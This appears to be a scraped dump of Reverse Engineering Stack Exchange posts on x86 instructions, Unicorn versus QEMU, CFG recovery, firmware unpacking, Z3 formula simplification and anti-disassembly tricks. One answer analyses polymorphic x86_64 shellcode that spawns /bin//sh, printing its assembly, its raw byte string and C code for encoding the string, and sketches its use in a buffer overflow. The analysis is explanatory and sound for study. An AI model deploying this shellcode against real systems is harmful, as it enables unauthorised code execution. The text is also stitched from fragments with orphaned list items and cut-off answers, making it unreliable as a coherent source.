<p>The <code>lea</code> instruction loads the address of its operand, instead of the operand itself. In C terms, you could look at [eax-1] as *(eax-1), and <code>lea</code> adds a <code>&amp;</code> operator to that, so <code>lea edx, [eax-1]</code> is like <code>edx = &amp;(*(eax-1))</code>. Which is the same as <code>eax-1</code> of course.</p>

<p>The compiler could have done exactly the same using the instruction sequence <code>mov edx, eax; sub edx, 1</code> or <code>mov edx, eax; dec edx</code>. So, why did it use the <code>lea</code> instruction?</p>

<p>The answer is that, historically, resolving addresses in <code>lea</code> was done using dedicated address bus hardware and bypassed the ALU. Also, pipelining had its issues when the same register was used twice in subsequent operations. Which means, on <strong>older</strong> processors, using <code>lea</code> was a few cycles faster than the alternatives, and it's not hard to implement in the compiler, so this is what compilers traditionally did.</p>

<p>On new processors, the distinction ""<code>lea</code> uses separate hardware"" isn't (neccesarily) made any more, and pipelining is a lot more intelligent than it used to be, so i doubt it's make any difference these days. But it's still in the compilers, and won't get removed from them because there's just no good reason to.</p>

"Unicorn and QEMU: Example use cases to understand the differences","1122","","<p>The Unicorn <a href=""http://www.unicorn-engine.org/docs/beyond_qemu.html"" rel=""nofollow"">website</a> lists some differences between Unicorn and QEMU, especially those differences ""where Unicorn shines"".</p>

<p>They furthermore write:</p>

<blockquote>
  <p>A notable difference between Unicorn and QEMU is that we only focus on emulating CPU operations, but do not handle other parts of computer machine like QEMU.</p>
  
  <p>[...] we stripped all the subsystems that do not involve in CPU emulation.</p>
</blockquote>

<p>I am trying to understand what this actually means, i.e. when to choose QEMU and when Unicorn. Especially, what are concrete example use cases (in the area of reverse engineering) in which Unicorn*) cannot be used, but QEMU can ?</p>

<p>*) or any tools based on Unicorn such as <a href=""https://github.com/lunixbochs/usercorn"" rel=""nofollow"">usercorn</a></p>
","<h2>What does ""<em>(not) emulating hardware other than the CPU</em>"" mean?</h2>

<p>This means that whenever the software being emulated accesses hardware, it won't work in Unicorn in the same way as on actual hardware.</p>

<p>We have several questions about emulating firmware on QEMU. The general answer is that, when you try booting a firmware kernel in QEMU, that kernel will access some I/O ports, but in the emulated environment, those I/O ports won't react in the way they should. For example, an input bit that signals ""device ready"" will be stuck in one state, instead of toggling between true and false.</p>

<p>To make your software work as intended, you need to emulate this hardware as well - for example, your emulator needs to know something like: </p>

<blockquote>
  <p>Bit 3 of the input port at <code>0x124</code> is the ""<em>ready</em>"" bit, when it's set to <code>1</code>, there's one byte of serial input waiting at port <code>0x125</code>. Reading port <code>0x125</code> will reset the ready bit to <code>0</code>, and it will stay in state <code>0</code> until the next byte arrives on the serial line.</p>
</blockquote>

<p>And if you want to emulate how a software reacts on some particular input on the serial interface, you'll have to build on that specification and make the emulator provide your input at these I/O ports.</p>

<p>But of course, you need information about the hardware first, so this isn't very useful to reverse engineering. It may be useful to the hardware designer though to find some bugs that are difficult to reproduce or monitor on actual hardware.</p>

<p>As a specific example, consider the <a href=""https://en.wikipedia.org/wiki/A20_line"" rel=""nofollow noreferrer"">A20 gate</a> on 16/32 bit PCs. Indeed, the same instructions:</p>

<pre><code>mov ax,0ffffh
mov es,ax
mov ax,es:[01234h]
</code></pre>

<p>May access different memory depending on some bits you wrote to the keyboard controller. You can't get this right in an emulator unless you emulate hardware as well.</p>

<h2>When is QEMU more useful?</h2>

<p>Mostly for not RE-related tasks.</p>

<p>If you want to emulate an old MS DOS program, you'd need QEMU, just because those programs did so much hardware manipulation themselves as the OS lacked the APIs. (Of course, in this case <a href=""https://www.dosbox.com/"" rel=""nofollow noreferrer"">DOSBox</a> would probably be more suited than QEMU).</p>

<p>Or, if you want to make an emulator for a Gameboy, C64, or just any other kind of vintage hardware, you need to simulate the hardware as well, so you'd need these QEMU features.</p>

<h2>When is Unicorn more useful?</h2>

<p>For RE tasks, you typically don't need hardware emulation, because you don't have access to hardware design documents anyway. So, an emulator that omits these parts of QEMU, and improves other parts, is probably more suited to RE than QEMU is. Especially the ""<em>does not need an environment</em>"" part can make stuff easier. </p>

<p>As a concrete example, take one of those ""<em>do my homework for me</em>"" questions - <a href=""https://reverseengineering.stackexchange.com/questions/12534/translate-the-assembly-code-to-c-code"">this</a>, and <a href=""https://reverseengineering.stackexchange.com/questions/12530/how-to-convert-assembly-to-c-code"">this</a>. When you have an assumption what a function does, you may want to run it to check if some specific input produces the output you assume. With QEMU, you need to compile this to an ELF file, and set up an operating system to run your program; with Unicorn, it seems like you can run the snippet directly (of course you still have to assemble it, and need to initialize registers in a sensible way, but you don't need all the rest of the bloat).</p>

<p>Or, another example, you have a program that deals with DRM protected data, and includes some functions to decrypt the DRM. If that program runs on ARM Android or I/OS, and you want to have your PC do the decryption, you can try loading the program into memory and tell your emulator ""<em>start emulating at address <code>0x12345678</code></em>"". It seems to be much easier to do this if you don't have to provide all the environment, and dependencies, that QEMU requires.</p>

<li>Angr (breaks easily or computes forever)</li>
<li>Radare2 (is there any api to export cfg data?)</li>
<li>JakStab (limited to x86)</li>
</ul>

<p>rather obvious choice, still, exporting a interprocedural CFG is still a pain. Also, although it is able to find all basic blocks of this example, it misses all indirect edges.</p>

<p>The projects should offer come kind of API to provide the cfg. I know solving this problem with static-analysis alone may be infeasible. I'm looking for a best-effort approach.</p>
","<p>For now, the most efficient approaches in practice seems to follow the principle of <a href=""https://en.wikipedia.org/wiki/Symbolic_execution"" rel=""nofollow"">symbolic execution</a>. This technique, originally developed to automatically build-up a set of test cases based on a given source code, has been recently used in binary analysis to discover and (partially) recover the CFG of the analyzed binary program.</p>

<p>Most of the time, if you want to deal with several assembly languages, you need to use an intermediate representation for the programs. For now, there have been a lot of these generic models and none did really got the supremacy over the others. Yet, the most populars seems to be the intermediate representation of LLVM (many tools use it), the second most popular seems to be VEX, the intermediate representation used in Valgrind (as used in Angr). The one from QEMU or the language RREIL might also be an option, but they are less commonly used. But, most of the projects come with their own intermediate representation.</p>

<p>Then, what you need to build up a CFG-recovery program based on symbolic execution are the following modules:</p>

<ul>
<li><p><strong>Loader</strong>: This module is in charge to take your binary program (it may be an executable or a library) and simulate the work of the native loader to build a realistic memory image of what you get after the loading process has been achieved.</p></li>
<li><p><strong>Decoder</strong>: This module is in charge of translating the native assembly found while symbolically executing the program into your own intermediate representation. It is a quite lengthy (and painful) piece of code to implement! So, be prepared to suffer while doing this.</p></li>
<li><p><strong>Symbolic execution engine</strong>: Usually based on an SMT-solver using the logic QF_AUFBV (Quantifier Free / Arrays / Uninterpreted Function / Bitvectors), the symbolic execution engine can really be a performance bottleneck if you code it naively because the recovery of the CFG will use it a lot. Here, having a good formula simplification (or slicing) module is really the key.</p></li>
</ul>

<p>Apart from these three modules, you might also improve your tools by adding more advanced analysis and start coding an abstract interpretation framework that can be added on the top of your intermediate representation, just to have chance to unveil some parts of the CFG that cannot be discovered just through the power of the SMT-solvers. </p>

<p>Also, performance is really the key to make your tools really usable. So, be able to capture the exact scope of a variable or the ability to detect a function or a module/object in the binary code helps a lot to reduce the size of the code you have to consider at once.</p>

<p>Now, I could give you a lot of pointers and articles about this topic, but I lack a bit of time. I might come back to finish writing an extensive list later on, but the general idea has been, hopefully, given above. Hope this might help you.</p>

"How to prevent automatic padding by IDA?","1100","","<p>I defined a struct in a header file, similar to this one:</p>

"Adding another section to an idb file","1098","","<p>I'm debugging a process inside a VM via Olly, and occasionally exporting a section dump when needed and loading it on the host system for better analysis.</p>

<p>Right now I'm looking at a dump of a certain code section that's referencing function calls in another, dynamically allocated, section. In the debugger I can of course see all the function calls, but in IDA all I have are calls to immediate addresses that don't exist.</p>

<p>I'd like to be able to dump the referenced section and somehow bluntly attach it to the same .idb so IDA would be able to resolve the references for me.</p>

<p>I couldn't find anything about it on google or when digging around the menus.
Did I miss something or is this impossible or requires an addon? It's also possible for me to write an idapython script that defines and copies the section over, but I don't see any relevant API calls.</p>

<p>Debugging via IDA and taking a full memory snapshot is a solution I'd like to not have to use; I enjoy using olly.</p>

"Does a Motorola SREC file give me any additional information over a binary ROM image?","1091","","<p>When working with embedded systems, it is often easiest to use a downloadable firmware file rather than recover the firmware from the device.</p>

<p>Mostly these are ROM images in the form of a .bin file. Sometimes, they are Motorola SREC files (often called .s19 files or .mot files). </p>

<p>These are easily converted into bin files using many available tools. The SREC files tend to only contain records where there is actually data/code and the gaps are filled with padding values during conversion. Padding tends to be 0x00 or 0xFF.</p>

<p>This can gives us a hint about the data segment of the image - it allows us to tell if the memory has been initialised with 0x00/0xFF intentionally by the compiler/assembler, or if it is just padding. Sometimes this can make identifying data structures easier.</p>

<p>Is there anything else an SREC file can leak?</p>
","<p>Correct me if I'm wrong, but since SREC is an ASCII representation of the binary data, wouldn't the corresponding binary file also ""leak"" sections of data that are padded with 0x00/0xFF?</p>

<p>With that said, yes, I think that in some cases SREC could expose useful information about the firmware that you wouldn't otherwise get with a binary image, assuming the vendor makes proper use of SREC's record types. Each line of text in an SREC file starts with a record code (S0, S1, S2, etc). Some example record types from <a href=""http://en.wikipedia.org/wiki/SREC_%28file_format%29#Format"" rel=""noreferrer"">Wikipedia's</a> SREC page:</p>

<blockquote>
  <p>The S0 record data sequence contains vendor specific data rather than
  program data. String with file name and possibly version info.</p>
  
  <p>Data sequence, depending on size of address needed. A 16-bit/64K
  system uses S1, 24-bit address uses S2 and full 32-bit uses S3.</p>
  
  <p>The address field of the S7, S8, or S9 records may contain a starting
  address for the program.</p>
</blockquote>

<p>Clearly, an SREC file provides information about the data in each record - information which normally would not be contained in a binary file. If you see an S7/8/9 record for example, you can probably assume that the firmware's entry point is located there. Likewise, the use of S2 vs S3 can tell you if the data contains 24 bit addresses or 32 bit addresses. </p>

<p>How common it is to use these different SREC record types in practice though, I couldn't say. A vendor could probably just mark everything with the same record type (S1 for example), which wouldn't really give you any more information about the data than a binary file would.</p>

"Hauwei E586 firmware","1091","","<p>I'm working on unpacking Hauwei E586 MiFi firmware. I downloaded firmware update pack which is available as Windows EXE, then used Hauwei Modem Flasher to unpack real firmware from installer.</p>

<p>I've got 4 files:</p>

<pre><code>01.bin: data
02.bin: ELF 32-bit LSB executable, ARM, version 1, statically linked, not stripped
03.bin: data
04.bin: ELF 32-bit LSB executable, ARM, version 1, statically linked, not stripped
</code></pre>

<p>As we can see <code>02</code> and <code>04</code> are executable files. <code>01</code> is probably some kind of bootloader (I assume it from string analysis). <code>03</code> is some kind of pseudo FS.</p>

<p>I started from analyzing <code>03</code> (I posted it <a href=""http://czlug.icis.pcz.pl/~pbm/03.bin"" rel=""nofollow"">here</a>):</p>

<p>There is header part</p>

<pre><code>02 00 EE EE  50 BA 6E 00  20 00 00 00  D0 A2 02 00
7B 02 00 00  00 00 00 00  00 00 00 00  00 00 00 00
</code></pre>

<p><code>7B 02</code> as 16 bits gives 635 which is number of files in binary (verified using <code>strings</code>). Then there are 635 parts describing each file (call it directory) and at the end there is content of files.</p>

<p>There is directory entry for first GIF file which I found. I choosed GIF because it's easy to identify (there is header GIF8X and footer 0x3B).</p>

<pre><code>77 77 77 5C  75 6D 5C 70  75 62 6C 69  63 5F 73 79
73 2D 72 65  73 6F 75 72  63 65 73 5C  42 75 74 74
75 6E 5F 43  75 72 72 65  6E 74 2E 67  69 66 00 00
lot of zeros
18 22 11 00  10 02 00 00  00 00 00 00  00 00 FF EE
</code></pre>

<p>We can see its name: <code>www\um\public_sys-resources\Buttun_Current.gif</code> and in last line there is offset of file in binary and file size, but I'm not really sure how to interpret this values.</p>

<p>I found first GIF after directory and extracted it manually (from header to footer) which gives me file of size 528 bytes, so reading <code>10 02</code> as 16 bit unsigned gives me that number. I tried to treat <code>18 22</code> as 16 bit unsigned to get offset, but it was different from offset that I manually read from file. Bu there was constant difference between offset and real offset of file of <code>1286864</code>. So I created script for unpacking this binary (I'm getting offset and adding to it <code>1286864</code>).</p>

<p>Script worked only partially. It recreated directory structure, but was able only to extract files in one particular directory (directory with GIF which I was using as reference). After check on different part of file it seems that offset of offset in different subdirectories is another that in this GIF directory. So, my guess is that I'm interpreting offset wrong (but treating it as 32 bits gives nothing useful).</p>

<p>There is unpack script:</p>

<pre><code>import sys, struct, os

def main(args):
    outdir = args[1]
    f = open(args[0], 'rb')
    f2 = open(args[0], 'rb')
    header = f.read(32)
    print(len(header[16:]))
    number_of_files = struct.unpack(""h"", header[16:18])[0]
    print(number_of_files)

    for i in range(number_of_files):
        body = f.read(272)
        file_, rest = body.split(b'\x00', 1)
        offset = struct.unpack(""H"", body[256:258])[0] + 1286864
        size = struct.unpack(""H"", body[260:262])[0]
        file_ = file_.decode(encoding='UTF-8').replace('\\', '/')
        dirname = os.path.join(outdir, os.path.dirname(file_))
        filename = os.path.basename(file_)
        print(filename, size, offset, dirname)
        try:
            os.makedirs(dirname)
        except OSError:
            pass

        outfile = open(os.path.join(dirname, filename), ""wb"")
        f2.seek(offset)
        outfile.write(f2.read(size))
        outfile.close()

if __name__=='__main__':
    sys.exit(main(sys.argv[1:]))
</code></pre>

<p>Usage: <code>./script.py 03.bin output_directory</code></p>

<p>So my question is: what I'm doing wrong? Maybe I should read some another data type as offset/size? Which one?</p>
","<p>I managed to solve problem.</p>

<p>First file in directory is <code>ZSP.bin</code>. It doesn't matter if offset of this file is 16 or 32 bit because in both cases is 0. As I know where directory ends and first file after directory should be ZSP.bin.</p>

<p>Below there is last two lines of last directory entry and first line of which I suspected should be <code>ZSP.bin</code>.</p>

<pre><code>00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 
FC 94 6D 00  53 25 01 00  00 00 00 00  00 00 FF EE
11 00 10 00  30 00 00 00  10 00 00 00  00 00 00 00
</code></pre>

<p>Each directory entry ends with <code>FF EE</code>, so I checked offset of next byte and assumed that it will be begin of <code>ZSP.bin</code>. Offset of it was <code>0x2a2d0</code>. Then I checked size of <code>ZSP.bin</code>.</p>

<p>I know that where it is, but I didn't know if it is 16 bits or 32 bits (<code>B4 C3</code> or <code>B4 C3 0C 00</code>). When I added <code>B4 C3</code> as 16 bits unsigned to my known offset <code>0x2a2d0</code> I landed at address <code>0x36684</code> which doesn't look like beginning of XML file (which is third in directory, but second one have 0 length). So I tried adding <code>0xcc3b4</code> (32 bits value) to my offset, which gives me <code>0xf6684</code> and at this address there was beginning of XML file... :)</p>

<p>So I modified my code:</p>

<pre><code>offset = struct.unpack(""I"", body[256:260])[0] + 172752
size = struct.unpack(""I"", body[260:264])[0]
</code></pre>

<p>After manual check of some random not binary files all of them were ok (proper begins and ends of HTML and XML, GIFs identified as GIFs)...</p>

<p>BTW, idea of checking first file in directory not this GIFs was first thought that got to my mind after I woke up... :)</p>

</code></pre>

<p>As we can see, rax and rdx are both 0, which means that esi (or rsi) has been multiplied by zero.</p>

<p>This is important because the shellcode eventually uses a <strong>syscall</strong> on line 29. We can see that syscall on line 29 is preceded by <strong>add al,58</strong> where al is already 1, therefore the rax register will hold a value of 59. </p>

<p>The number <strong>59</strong> is the index for <strong>execve</strong> in the <a href=""https://filippo.io/linux-syscall-table/"" rel=""nofollow noreferrer"">Linux x86_64 syscall table</a> </p>

<p><strong>execve</strong> will execute /bin//sh. Let's check out the function prototype:</p>

<pre><code>int execve(const char *filename, char *const argv[], 
       char *const envp[]); 
</code></pre>

<p>According to the prototype's <a href=""http://www.tutorialspoint.com/unix_system_calls/execve.htm"" rel=""nofollow noreferrer"">description</a>, <strong><em>filename</strong> must be either a binary executable, or a script starting with a line of the form ""#! interpreter [arg]""</em></p>

<p>We will see that eventually the shellcode passed <strong>/bin//sh</strong> as this argument.</p>

<p><strong>argv</strong> are just the arguments passed to the binary. In this case, the arguments are NULL because as we have seen before, the <strong>rsi</strong> register was previously zeroed out on line 20.</p>

<p>Similarly, <strong>envp</strong> are the environment arguments passed to the binary. Again, there are none because we have seen that the <strong>mul %esi</strong> instruction has zeroed out both <strong>rsi</strong> and <strong>rdx</strong>. In x86_64 Linux, the <strong>rsi</strong> and <strong>rdx</strong> registers are the second and third arguments to <strong>execve()</strong> respectively.</p>

<p>You can find more information on x86_64 calling conventions <a href=""https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64"">here</a> to see how arguments are passed into functions. </p>

<p>Finally, the first argument in <strong>execve</strong> is <strong>/bin//sh</strong>, which is eventually passed to the <strong>edi</strong> register. <strong>edi</strong> holds the first function argument in Linux x86_64 assembly.</p>

<p>The interesting part is that this is <strong>polymorphic shellcode</strong>. We can think of polymorphic shellcode as obfuscated machine instructions that deobfuscate themselves upon execution.</p>

<p>On line 23, the hex string <strong>0xd2c45ed0e65e5edc</strong> in ascii is <strong>ÒÄ^Ðæ^^Ü</strong> which is clearly obfuscated.</p>

<p>Lines 24 and 25 deobfuscate this string and we get <strong>0x68732f2f6e69622f</strong> which is <strong>hs//nib/</strong> in ascii. This is <strong>/bin//sh</strong> spelt backwards because the argument is passed <strong>to execve()</strong> in <a href=""https://en.wikipedia.org/wiki/Endianness"" rel=""nofollow noreferrer"">little endian byte order</a>.</p>

<p>For proof of concept, you can run the code in gdb, or use the following deobfuscator I wrote:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;inttypes.h&gt;

uint64_t rol(uint64_t v, unsigned int bits)
{
  return (v&lt;&lt;bits) | (v&gt;&gt;(8*sizeof(uint64_t)-bits));
}

int main(void)
{
  uint64_t obfuscated = 0xd2c45ed0e65e5edc;
  uint64_t deobfuscated = rol(obfuscated, 24);
  deobfuscated /= 2;
  printf(""0x%"" PRIx64 ""\n"", deobfuscated);
  return 0;
}
</code></pre>

<p>You will get the deobfuscated hex string <strong>0x68732f2f6e69622f</strong> which again, is <strong>hs//nib/</strong> in ascii.</p>

<p>Line 26 pushes the deobfuscated /bin//sh on top of the stack (i.e. in the <strong>rsp</strong> register) and line 27 loads the address pointing to the string <strong>/bin//sh</strong> into <strong>rdi</strong>. Again, please note that this string is being passed in little endian byte ordering. Now we can clearly see that <strong>/bin//sh</strong> is the first argument in <strong>execve()</strong></p>

<p>Then, the shell is executed on line 29.</p>

<p>Below is a commented pseudocode summary:</p>

<pre><code>_start:
    mul esi                     ; When this shellcode is executed, rsi and rdx become 0 because they are multiplied by rax which is 0, in Linux x86_64 assembly, rsi is the second argument in a function
    push rdx                    ; save rdx (i.e. the buffer pointer to the shellcode), rdx is also the third argument passed to a syscall in x86_64
    mov al,1                    ; used for obfuscation since mov al, 59 followed by syscall may look suspicious                       
    mov rbx, 0xd2c45ed0e65e5edc ;/bin//sh obfuscated 
    rol rbx,24                  ; Deobfuscate the hex string /bin//sh
    shr rbx,1                   ; Division by 2 to further deobfuscate /bin//sh
    push rbx                    ; Push the hex string on the top of the stack [in rsp]
    lea rdi, [rsp]              ; Load /bin//sh into rdi in little endian
                                ; in linux 86_64 the first argument is passed to rdi during a syscall
    add al,58                   ; al = 59 i.e. call execve
    syscall                     ; execve(""/bin//sh"", 0, *shellcode_buffer)
</code></pre>

<p>As for the C code, the machine instructions that represent the compiled assembly from lines 17 - 29 are stored in a global variable. We can use the following commands to check the bytes from the shellcode:</p>

    $ ld shell.o -o shell
    $ xxd shell

<pre><code>unsigned char code[] = ""\xf7\xe6\x52\xb0\x01\x48\xbb\xdc\x5e\x5e\xe6\xd0\x5e\xc4\xd2\x48\xc1\xc3\x18\x48\xd1\xeb\x53\x48\x8d\x3c\x24\x04\x3a\x0f\x05"";
</code></pre>

<p>The code in <strong>main</strong> simply casts the string buffer global variable into a function pointer which is then called, executing the polymorphic shellcode, and spawning a shell.</p>

<p>Finally, shellcode is just a possible part of an exploit. An exploit consists of an input that is precisely tailored to a specific version of a program and OS. The shellcode can be part of the payload, but operating systems have became more secure adding ASLR (Address Stack Layout Randomization) and DEP (Data Execution Prevention), so generally it is more practical to overwrite a function pointer in to GOT (Global Offset Table) than to inject shellcode into a buffer. Assuming that you were performing a generic stack buffer overflow, the buffer would have to be at least 0x19 bytes long. You would also need some more space to compensate for the rest of the exploit. In other words, you would need a buffer with enough space to fit the shellcode and the rest of the exploit so that you could overwrite the RET address on the stack to redirect program execution (RIP/EIP) to your shellcode. </p>

<p>This is just an example, but there are many more ways this shellcode can be used in a exploit. </p>

<p>Taking a few steps back, this shellcode could fail if <strong>esi/rsi</strong> is not 0 to begin with because if it is not zero, then we will have a second argument passed into <strong>execve()</strong> and possibly even a third agument if the result from the instruction <strong>mul esi</strong> overflows into <strong>edx</strong>. The shellcode would be more reliable if there were an <strong>xor esi, esi</strong> instruction preceeding the <strong>mul</strong> <strong>esi</strong> instruction.</p>

<p>We also might think how the exploit developer came up with the obfuscated hex string <strong>0xd2c45ed0e65e5edc</strong>. They simply took original string <strong>hs//nib/</strong> and applied the deobfuscating instructions in reverse order. You can use the following code for proof of concept:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;inttypes.h&gt;

uint64_t ror(uint64_t v, unsigned int bits)
{
  return (v&gt;&gt;bits) | (v&lt;&lt;(8*sizeof(uint64_t)-bits));
}

int main(void)
{
  uint64_t deobfuscated = 0x68732f2f6e69622f;
  uint64_t obfuscated = deobfuscated * 2;
  obfuscated = ror(obfuscated, 24);
  printf(""0x%"" PRIx64 ""\n"", obfuscated);
  return 0;
}
</code></pre>

<p>You should get the original obfuscated hex string <strong>0xd2c45ed0e65e5edc</strong>.</p>

"How to efficiently simplify obfuscated formula in QF_BV logic with Z3?","1076","","<p>I would like to know if there are efficient ways to simplify arithmetic formula expression over bit-vectors with <a href=""http://z3.codeplex.com/"" rel=""nofollow"">Microsoft Z3</a>. But, first, I would like to explain a bit the problem. Lets start with an example:</p>

<pre><code>x + y == (x ^ y) + 2 * (x &amp; y)
</code></pre>

<p>Both <code>x + y</code> and <code>(x ^ y) + 2 * (x &amp; y)</code> are, in fact, coding the addition over bit-vectors. Of course, the right hand formula is used to confuse a reverser when found in the binary program. I try to find tools and techniques to simplify the obfuscated formula and find the simpler form of the formula (left-hand).</p>

<p>For this, I looked at the Python interface of Z3, trying to see what I can get out of it. So, defining the obfuscated formula is done like this:</p>

<pre><code>&gt;&gt;&gt; from z3 import *
&gt;&gt;&gt; x = BitVec('x', 32)
&gt;&gt;&gt; y = BitVec('y', 32)
&gt;&gt;&gt; fun1 = (x ^ y) + 2 * (x &amp; y)
</code></pre>

<p>Now, lets try to simplify this function with the help of the built-in function <code>simplify</code>:</p>

<pre><code>&gt;&gt;&gt; simplify((x ^ y) + 2 * (x &amp; y))
(x ^ y) + 2*~(~x | ~y)
</code></pre>

<p>Not really convincing... But, lets try to prove the equivalence with <code>x + y</code>:</p>

<pre><code>&gt;&gt;&gt; prove((x ^ y) + 2 * (x &amp; y) == x + y)
proved
&gt;&gt;&gt; prove((x ^ y) + 2 * (x &amp; y) == x - y)
counterexample
[y = 2164268032, x = 2139094080]
</code></pre>

<p>I added a negative result to show that it is also possible to disqualify a formula.</p>

<p>So, if the <code>simplify</code> function is not really convincing, it is still possible to try, in a brute-force manner to compare the unknown formula with a list of simpler and usual formula one after one. But, this way seems extremely inefficient to me. I guess I am missing some smarter algorithms to simplify formula.</p>

<p>I would like to know if there are some already existing tools or well-known techniques to perform in a more efficient manner than the brute-force approach. So, if someone has some hints or comments about this, it would be more than welcome.</p>
","<p>Z3 is an SMT solver.  Its job is to decide the satisfiability of formulas passed in by a user, where the formulas may mix terms from the various theories that Z3 supports.  Coincidentally, in order to make its own job easier by producing a ""simpler"" formula than the one passed in by the user, it implements a simplifier which is not very sophisticated technologically and largely consists of term rewriting rules.</p>

<p>Although the user could pose a query regarding the equivalence of two expressions, Z3's only involvement would be to solve the formula.  I.e. Z3 will not generate candidates for you.  It is your job as the user to provide the candidates and query an SMT solver as to their satisfiability.</p>

<p>In general, synthesizing functions is a challenging task in program synthesis.  These queries are naturally posed in second-order logic, but modern SMT solvers support only restrictions of first-order logic.  To sidestep this problem, some published work takes the route of eliminating most candidates from consideration ahead of time, thereby keeping the number of equivalence queries small.  See for example <a href=""http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.93.8843&amp;rep=rep1&amp;type=pdf"">this paper</a> or <a href=""http://spinroot.com/spin/Workshops/ws13/spin2013_submission_16.pdf"">this one</a>.  Another approach is to specify a template describing what the candidate functions are allowed to look like; a simple example is <a href=""http://theory.stanford.edu/~ataly/Papers/pldi12.pdf"">this paper</a>.  These approaches keep the formula to first-order logic, or even quantifier-free.</p>

Whenever I disassemble an app, I find the packages and package hierarchy (that would have been available in development scenario) intact. For instance, when I disassemble a task manager app (MD5: 3377f8527479ab4e72bf9fa5eec62abe), I get the package hierarchy as shown in the figure below.<img src=""https://i.stack.imgur.com/Zrhkg.png"" alt=""enter image description here"">. </p>

Will the packages and package hierarchy information be retained in this classes.dex file or any other part of the apk file (like META-INF)? </li>
<li>If this information is not available from .dex, where does this come from? How does every disassembling/ decompiling tool manages to extract this package hierarchy?</li>
<li>Where to find documentation/ literature relevant to packages and package hierarchy in the app building process? I tried skimming thro' Android documentation in vain.</li>

"What is this obfuscation method called?","1071","","<p>I have recently seen the following code obfuscation method: </p>

<pre><code>...
jump loc_1234
;-------------------------
         Bunch of junk
;-------------------------

loc_1234:
code continued...
</code></pre>

<p>The logic behind the obfuscation mechanism looks pretty straight forward. Bunch of junk is inserted into code with jump instructions to jump over it. I guess, the purpose is to confuse linear sweep disassemblers and obfuscate file in general. I would like to learn more about it. Does anyone know what it is called? How effective is this method against modern day anti-virus software?</p>
","<p>This anti-disassembly technique is described as <strong>Jump Instruction with a Constant Condition</strong> in the <em>Pratical Malware Analysis</em> book (Chapter 16, page 336 of the 1st edition). The idea as you described is to have a condition such that the jump is always taken and add code after the jump that will generate a wrong disassembly at the location of the jump. As the disassembler assumes that both branches are coherent, it will disassemble only one of them.</p>

<p>Regarding effectiveness against antivirus software, most of them use emulators. As the condition is always taken, the emulator will continue there and see the right instructions. </p>

<li>Define a <code>struct</code> in the ""structures"" window.</li>

"Reverse engeneering Devolo firmware","1067","","<p>I am trying to do some reverse engeneering to a Devolo dlan wifi 500 device (mips arquitecture). My objective is to put there some firmware modified by me.</p>

<p>This is where I got so far:</p>

<ol>
<li>Downloaded a firmware update from <a href=""http://update.devolo.com/linux2/apt/pool/main/d/devolo-firmware-dlan500-wifi/"" rel=""nofollow noreferrer"">http://update.devolo.com/linux2/apt/pool/main/d/devolo-firmware-dlan500-wifi/</a></li>
<li>Extracted firmware image from debian package</li>
<li>Analyzed image with binwalk</li>
<li>Extracted contents with firmware mod kit (present on google code).</li>
<li>Modded image</li>
<li>Rebuilded with fmk</li>
<li>Used web interface of device to upload new firmware</li>
</ol>

<p>It failed on step 7. I get a message saying something like ""this file does not contain valid data"". So, some sort of verification is performed by the device before installing updates.</p>

<p>So I kept investigating. The devolo image contains a devolo header/footer, a uboot and a uimage. The header/footer must contain some sort of checksum. I tried picking the valid (unadultered) update and changed one bit on the padding, uploaded it to the device and got the same error message.</p>

<p>If I knew where the cheksum is or how is obtained, I could change it after rebuilding the image. However I found no documentation about the devolo formats. To try to find the sum I compared the hexadecimal of two devolo images: wifi and wireless(the wireless image is on the same site from where I downloaded the wifi image; could not post this link and the fmk link because I have less than 10 reputation :( ). The headers/footers are very similar in most fields, though I found no 32byte field to be a sum. Perhaps someone more experienced on reverse engeneering could help me.</p>

<p>I could try to brute force the sum. Since it is a sum, I could create a colision by adding bits to the padding areas. For this I have two ideas:</p>

<ol>
<li>Send through the network every combination possible;</li>
<li>Use the downloaded image's libraries to test the sum locally;</li>
</ol>

<p>Option 1 would probably take a few years...</p>

<p>For option 2, I tried using a qemu virtual machine and compile there, and cross compiling, with no results, due to the devolo libs using an old libc version (<a href=""https://stackoverflow.com/questions/29153924/how-to-solve-c-conflicts-between-system-and-library-dependencies"">https://stackoverflow.com/questions/29153924/how-to-solve-c-conflicts-between-system-and-library-dependencies</a>).</p>

<p>My last idea is to somehow emulate the downloaded firmware in my amd64 machine, to compile some code there that would use the devolo libs, thus circumventing the dependency problems.</p>

<p>So, I would thank any tips/mistakes on my previous steps, and any pointers on how to run the downloaded image on my pc.</p>

<p>Thanks in advance (if for nothing, for reading my rather long post).</p>
","<p>Each section in the firmware file has a crc32 over its contents.</p>

<p>See <a href=""https://github.com/booto/develo_fw"" rel=""nofollow"">this</a>.</p>

<p>It should make option 1 more viable.</p>

<p>More details:
Inside the squashfs image there's whole heap of busybox based tools and a handful of standalone programs. There's one (<em>/usr/sbin/chunk</em>) that looked likely to have logic concerning the traversal of the firmware files. It contains a number of the 32bit values that matched the values in the firmware file that look like magic/fourcc values. strings(1) output was also pretty encouraging.</p>

"How to find the size of an array in binary?","1065","","<p>I'm currently learning RE and try to understand some basic c programs.</p>

<p>I've almost figure out some concepts, but right now i've no idea how to find the size of an array when i use objdump or gdb.</p>

<p>for example :</p>

<pre><code>int main(int argc, char **argv)
{
  char buffer[64];               // &lt;= Where i supposed to find the array size ?
  gets(buffer);                   
  printf(""Buffer : %s"",buffer);
  return 0;
}
</code></pre>

<p>Anyone can explain me how is it possible ?</p>
","<p>There's no easy way to do this, C doesn't have a concept of array sizes (at execute time), so the size isn't stored anywhere. You'll have to read the assembly code and (try to) understand it.</p>

<p>Take the following program</p>

<pre><code>extern void *malloc(int);
extern char *strcpy(char *dst, char *src);

char firstname[80];
char lastname[80];

int main(void) {
    int some_variable=1;
    char buffer[64];
    int some_other_variable=2;
    char *otherbuffer=malloc(100);
    gets(buffer);
    strcpy(firstname, ""John"");
    strcpy(lastname, ""Doe"");
}
</code></pre>

<p>and compile it with <code>cc -fno-builtin -O0 -o arraysize arraysize.c</code>. (I had to disable built-in functions to prevent gcc from short-circuiting malloc and strcpy, and i declared them myself instead of using the headers for the same reason. Also, without -O0, gcc omits stuff that's never used).</p>

<p>Then, use <code>objdump -d arraysize</code> and check the <code>main</code> function:</p>

<p>The C source code said</p>

